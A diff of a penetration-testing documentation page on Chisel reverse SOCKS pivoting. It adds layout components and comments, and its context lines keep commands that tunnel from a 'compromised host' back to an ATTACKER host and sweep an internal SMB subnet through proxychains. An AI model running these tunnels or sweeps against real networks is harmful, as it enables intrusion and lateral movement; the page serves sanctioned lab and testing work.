@@ -5,6 +5,14 @@ description: "Find the saved Chisel client and server commands for building a re
 keywords: ["chisel", "reverse socks", "client", "server", "http tunnel", "1080", "pivoting"]
 ---
 
+{/* VAULT_TASK_FINDER_START */}
+
+import { TargetContextBar } from "/snippets/target-context-bar.jsx";
+
+<TargetContextBar />
+
+{/* VAULT_TASK_FINDER_END */}
+
 {/* COMMAND_SHORTCUT_START */}
 
 **Current starting checks:** [Chisel](/commands/chisel) · [Systems & Pivoting: Enumeration Methodology](/pivoting/methodology)
@@ -12,6 +20,8 @@ keywords: ["chisel", "reverse socks", "client", "server", "http tunnel", "1080",
 Verify the callback path, selected listener and pivot-to-service reachability separately. A connected Chisel client is not proof the destination works.
 
 {/* COMMAND_SHORTCUT_END */}
+
+{/* Generated from Pivoting/Chisel.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
 ## Build a reverse SOCKS tunnel in three places
 
@@ -80,8 +90,6 @@ Choose either the single-service mapping or SOCKS according to the task. Check w
 
 Keep the session running while clients depend on it. Stop your tunnel processes and verify their listeners disappear during cleanup. The original recipes below remain useful for their specific lab addresses; the roles above explain which values to replace.
 
-## Existing notes and worked examples
-
 TCP/UDP tunnels over HTTP — reach an internal subnet through a compromised host.
 
 ```bash
@@ -98,6 +106,4 @@ proxychains nxc smb 172.16.5.0/24
 ./chisel client ATTACKER:8080 R:3389:172.16.5.19:3389
 ```
 
-<Tip>
 Match the chisel binary to the victim's arch. Statically-compiled builds avoid missing-library issues on stripped hosts.
-</Tip>
